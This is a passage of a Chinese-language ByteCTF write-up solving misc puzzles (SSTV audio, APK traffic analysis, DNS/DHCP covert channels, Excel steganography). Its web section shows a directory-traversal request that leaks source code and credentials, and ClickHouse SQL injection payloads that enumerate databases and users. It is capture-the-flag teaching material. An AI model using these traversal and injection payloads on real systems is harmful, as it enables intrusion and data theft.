      <description>&lt;h2 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; title=&quot;Ｍisc&quot;&gt;&lt;/a&gt;Ｍisc&lt;/h2&gt;&lt;h3 id=&quot;HearingNotBelieving&quot;&gt;&lt;a href=&quot;#HearingNotBelieving&quot; class=&quot;headerlink&quot; title=&quot;HearingNotBelieving&quot;&gt;&lt;/a&gt;HearingNotBelieving&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;Hearing is not believing&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;将附件的音频使用 Audition</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Ｍisc"></a>Ｍisc</h2><h3 id="HearingNotBelieving"><a href="#HearingNotBelieving" class="headerlink" title="HearingNotBelieving"></a>HearingNotBelieving</h3><blockquote><p>Hearing is not believing</p></blockquote><p>将附件的音频使用 Audition 打开可以在其前面发现分割的二维码。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634620470941119/48e96bf072ae3441d82c7882da2ed2e285791c8b.png"></p><p>将二维码合成处理可以得到如下二维码。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634620626932789/4780ae55d0fd763f4ac3f79bfb533b77f2d61220.png@200w.png"></p><p>扫描二维码可得如下内容。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m4yB3_</span><br></pre></td></tr></table></figure><p>将音频后面的内容使用 RX-SSTV 进行接受可得 16 张图片。将图片按照顺序 4*4 拼接即可得到如下图片。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634620689531183/d703186770be8768899cdc68a7a66b1e0c211f46.png@300w.png"></p><p>将二维码复原可得如下二维码。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634620733206761/041be496ce7aac1da1a65a0762bc2210dd3e5fa1.png@200w.png"></p><p>扫描二维码可得如下内容。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U_kn0W_S57V&#125;</span><br></pre></td></tr></table></figure><p>将得到的两部分 flag 拼合即可得到完整的 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ByteCTF&#123;m4yB3_U_kn0W_S57V&#125;</span><br></pre></td></tr></table></figure><h3 id="BabyShark"><a href="#BabyShark" class="headerlink" title="BabyShark"></a>BabyShark</h3><p>使用 WireShark 进行流量分析，在 TCP 流 0 处可以发现调试桥的流量。从中可以提取出一个 apk 文件。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634620786377949/844179c9969a7684f894411b54401d4210bdbec0.png"></p><p>提取出的安装包可以使用 jadx-gui 进行反编译，可以发现其 MainActivity 中包含如下代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.misc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.Environment;</span><br><span class="line"><span class="keyword">import</span> android.os.StrictMode;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> androidx.core.app.ActivityCompat;</span><br><span class="line"><span class="keyword">import</span> dalvik.system.DexClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> okhttp3.HttpUrl;</span><br><span class="line"><span class="keyword">import</span> okhttp3.OkHttpClient;</span><br><span class="line"><span class="keyword">import</span> okhttp3.Request;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, androidx.fragment.app.FragmentActivity</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt; <span class="number">9</span>) &#123;</span><br><span class="line">            StrictMode.setThreadPolicy(<span class="keyword">new</span> StrictMode.ThreadPolicy.Builder().permitAll().build());</span><br><span class="line">        &#125;</span><br><span class="line">        AesUtil.decrypt(getAESKey(getPBResp(), loadPBClass(getPBClass()).getMethods()[<span class="number">37</span>]), <span class="string">&quot;8939AA47D35006FB2B5FBDB9A810B25294B5D4D76E4204D33BA01F7B3F9D99B1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Class <span class="title">loadPBClass</span><span class="params">(String jarFilePath)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> DexClassLoader(<span class="keyword">new</span> File(jarFilePath).getAbsolutePath(), getDir(<span class="string">&quot;dex&quot;</span>, <span class="number">0</span>).getAbsolutePath(), <span class="keyword">null</span>, getClassLoader()).loadClass(<span class="string">&quot;com.bytectf.misc1.KeyPB&quot;</span>).getClasses()[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPBClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (ActivityCompat.checkSelfPermission(<span class="keyword">this</span>, <span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            ActivityCompat.requestPermissions(<span class="keyword">this</span>, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>&#125;, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> HttpUrl.FRAGMENT_ENCODE_SET;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ActivityCompat.checkSelfPermission(<span class="keyword">this</span>, <span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            ActivityCompat.requestPermissions(<span class="keyword">this</span>, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>&#125;, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> HttpUrl.FRAGMENT_ENCODE_SET;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Environment.getExternalStorageState().equals(<span class="string">&quot;mounted&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> Environment.getExternalStorageDirectory().getAbsolutePath() + <span class="string">&quot;/PBClass.dex&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> HttpUrl.FRAGMENT_ENCODE_SET;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getAESKey</span><span class="params">(<span class="keyword">byte</span>[] pb_bytes, Method parseFrom)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object respObj = parseFrom.invoke(<span class="keyword">null</span>, pb_bytes);</span><br><span class="line">            <span class="keyword">return</span> ((Long) respObj.getClass().getMethod(<span class="string">&quot;getKey&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]).invoke(respObj, <span class="keyword">new</span> Object[<span class="number">0</span>])).longValue();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] getPBResp() &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] pb_res = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> OkHttpClient().newCall(<span class="keyword">new</span> Request.Builder().url(<span class="string">&quot;http://192.168.2.247:5000/api&quot;</span>).build()).execute().body().bytes();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> pb_res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中针对一个 dex 进行了动态加载，但是这里并没有给出这个 dex 文件。在 onCreate 中使用到了这个 dex 文件中的类进行反射来获取密钥。而 getPBResp 方法中与后端的 API 进行了交互，因此在流量包中找到对应的响应。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634621373482519/76b56b2710e243534ddb5249bd8f6f6965181626.png"></p><p>可以发现响应的是一段二进制数据，这里需要脑洞一下，PBResp 实际上就是 ProtoBufResponse 的缩略写法。将如下响应数据使用 ProtoBuf 解码。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">08 8b b7 bd f5 db d5 37 11 a1 f8 31 e6 d6 1c c8 40</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">From_Hex(&#x27;Auto&#x27;)</span><br><span class="line">Protobuf_Decode(&#x27;&#x27;,true,true)</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;field #1: VarInt (e.g. int32, bool)&quot;</span>: <span class="number">244837809871755</span>,</span><br><span class="line">    <span class="attr">&quot;field #2: 64-Bit (e.g. fixed64, double)&quot;</span>: <span class="number">4668012723080133000</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将反编译得到的 AesUtils 分离出来写出如下代码调用来解密 AES。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.misc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String text = AesUtil.decrypt(<span class="number">244837809871755L</span>, <span class="string">&quot;8939AA47D35006FB2B5FBDB9A810B25294B5D4D76E4204D33BA01F7B3F9D99B1&quot;</span>);</span><br><span class="line">        System.out.println(text);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上述代码即可得出 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ByteCTF&#123;Tr4ff1c4nalys_i5@Us3fu1&#125;</span><br></pre></td></tr></table></figure><h3 id="frequently"><a href="#frequently" class="headerlink" title="frequently"></a>frequently</h3><blockquote><p>Someone wants to send secret information through a surreptitious channel. Could you intercept their communications?</p></blockquote><h4 id="DNS-Protocol-Tunnel"><a href="#DNS-Protocol-Tunnel" class="headerlink" title="DNS Protocol Tunnel"></a>DNS Protocol Tunnel</h4><p>使用 WireShark 对流量包进行分析，可以发现大量的 xxxxxx.bytedanec.net 的 DNS 查询请求，将其域名的第一段分离出来，使用 Base64 进行解码可以得到如下图片。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634620842128581/c8c022c338e15391aedc7f4505739c08c3072e09.png"></p><p>接着分析剩余的 DNS 请求，可以发现其中的 i 和 o 遵循着某种规律。将其提取出来并使用如下 CyberChef Receipt 处理，可以得到如下信息。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Find_/_Replace(&#123;&#x27;option&#x27;:&#x27;Regex&#x27;,&#x27;string&#x27;:&#x27;i\\n&#x27;&#125;,&#x27;1&#x27;,true,false,true,false)</span><br><span class="line">Find_/_Replace(&#123;&#x27;option&#x27;:&#x27;Regex&#x27;,&#x27;string&#x27;:&#x27;o\\n&#x27;&#125;,&#x27;0&#x27;,true,false,true,false)</span><br><span class="line">Find_/_Replace(&#123;&#x27;option&#x27;:&#x27;Regex&#x27;,&#x27;string&#x27;:&#x27; &#x27;&#125;,&#x27;&#x27;,true,false,true,false)</span><br><span class="line">From_Binary(&#x27;Space&#x27;,8)</span><br><span class="line">The first part of flag: ByteCTF&#123;^_^enJ0y&amp;y0u9</span><br></pre></td></tr></table></figure><h4 id="DHCP-Protocol-IP-Address-Lease-Time"><a href="#DHCP-Protocol-IP-Address-Lease-Time" class="headerlink" title="DHCP Protocol IP Address Lease Time"></a>DHCP Protocol IP Address Lease Time</h4><p>在流量包中可以发现 DHCP 包，将 ACK 中包含的 IP Address Lease Time 提取出来可以得到后一半 flag。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">se1f_wIth_m1sc^_^&#125;</span><br></pre></td></tr></table></figure><p>将两半 flag 拼合即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ByteCTF&#123;^_^enJ0y&amp;y0u9se1f_wIth_m1sc^_^&#125;</span><br></pre></td></tr></table></figure><h3 id="Lost-Excel"><a href="#Lost-Excel" class="headerlink" title="Lost Excel"></a>Lost Excel</h3><blockquote><p>Please find out who leaked this document asap</p></blockquote><p>在给出的表格文件的 media 中可以得到一张图片。使用 StegSolve 可以在 Red plane 0 下得到另一张图。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634623169840229/80d32c00c3d0fe4eedbb534c19f06e757a6283c5.png@300w.png"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634623235868402/62e8be17e34f38fb1f362ced90b75e283a7de73b.png@200w.png"></p><p>这里又要脑洞一下，每四个像素块作为一个点，以黑点的顺序代表 0/1/2/3，最终达成四进制。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634626277976703/5bd70238a680893c745bf355b23e5bbd187bf550.png"></p><p>参考 W&amp;M 的 Write Up 写出了如下代码来获取 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line">image = Image.<span class="built_in">open</span>(<span class="string">&quot;solved.png&quot;</span>).convert(<span class="string">&quot;P&quot;</span>)</span><br><span class="line">width, height = image.size</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, height - <span class="number">7</span>, <span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, width - <span class="number">7</span>, <span class="number">8</span>):</span><br><span class="line">        data = [image.getpixel((x, y)), image.getpixel((x + <span class="number">4</span>, y)), image.getpixel((x, y + <span class="number">4</span>)), image.getpixel((x + <span class="number">4</span>, y + <span class="number">4</span>))]</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> <span class="keyword">in</span> data:</span><br><span class="line">            result += <span class="built_in">str</span>(data.index(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(number.long_to_bytes(<span class="built_in">int</span>(result, <span class="number">4</span>)))</span><br></pre></td></tr></table></figure><p>运行脚本可以得到如下信息。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&quot;\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc3\x1aY\x19\x19[\x95\xd3_@\x10\x9e]\x19P\xd5\x11\x9d0\x1e\x18\xd9[\x12\x1aY\x19\x19[\x95\xd3_@\x10\x9eULP\xd5\x11\x9e\xd1^\x18\xd9[\x12\x1aY\x19\x19[\x95\xd1\x03@\x10\x9e]\x19P\xd5\x11\x9e\xd1^\x18\xd9[\x12\x1a\\\x10\x19[\x95\xd3_@\x10\x9e]\x19P\xd5\x11\x9e\xd1^\x00\x11[\x12\x1aY\x19\x19[\x95\xd3_@\x10\x9e]\x19P\\F&#123;ExcelHiddenWM&#125;\x00\xe7\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFe\x11t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xe1\x06\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5D`\x15^\x18\xd9[\x12\x1aY\x19\x19[\x95\xd3_@\x10\x9ez\x19P\xd5\x11\x9e\xd1^\x18\xd9[\x12\x1aY\x19\x19[\x95\xd3P\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&quot;</span><br></pre></td></tr></table></figure><p>在其中可以得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ByteCTF&#123;ExcelHiddenWM&#125;</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Double-sqli"><a href="#Double-sqli" class="headerlink" title="Double sqli"></a>Double sqli</h3><h4 id="目录穿越读源码"><a href="#目录穿越读源码" class="headerlink" title="目录穿越读源码"></a>目录穿越读源码</h4><p>直接访问到 / 路由时可以得到一张图片的超链接，观察到其路由中有 /files 且使用的后端 server 是 nginx/1.21.1，尝试使用目录穿越去读取文件。构造 files../app/main.py 可以读出如下源码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">import</span> clickhouse_driver</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">client = clickhouse_driver.Client(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="string">&#x27;9000&#x27;</span>, database=<span class="string">&#x27;default&#x27;</span>, user=<span class="string">&#x27;user_02&#x27;</span>, password=<span class="string">&#x27;e4649b934ca495991b78&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cttttf</span>():</span></span><br><span class="line">    <span class="built_in">id</span> = request.args.get(<span class="string">&#x27;id&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">    sql = <span class="string">&#x27;select ByteCTF from hello where 1=&#123;&#125; &#x27;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a = client.execute(sql)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;a href=&quot;/files/test.jpg&quot;&gt;something in files&lt;/a&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(a)[<span class="number">3</span>:-<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>其中可以发现使用的数据库是 ClickHouse 及程序中使用的语句逻辑，还有 user_02/e4649b934ca495991b78 这对用户名密码。除此之外在 ClickHouse 的目录下的 /var/lib/clickhouse/access/3349ea06-b1c1-514f-e1e9-c8d6e8080f89.sql 中可以发现如下语句。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ATTACH USER user_01 IDENTIFIED WITH plaintext_password BY &#39;e3b0c44298fc1c149afb&#39;;</span><br><span class="line">ATTACH GRANT SELECT ON ctf.* TO user_01;</span><br></pre></td></tr></table></figure><p>可以发现用户 user_01 拥有 ctf.* 的权限，因此尝试注入。</p><h4 id="ClickHouse-注入"><a href="#ClickHouse-注入" class="headerlink" title="ClickHouse 注入"></a>ClickHouse 注入</h4><p>使用如下载荷可以在报错中得到库名 ctf 和 default。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> name <span class="keyword">from</span> system.databases limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>使用如下载荷可以在报错中得到表名 hint 和 hello。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> system.tables limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>使用如下载荷尝试读取用户可以发现权限不足报出的如下信息。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> name <span class="keyword">from</span> system.users limit <span class="number">0</span>,<span class="number">1</span>)</span><br><span 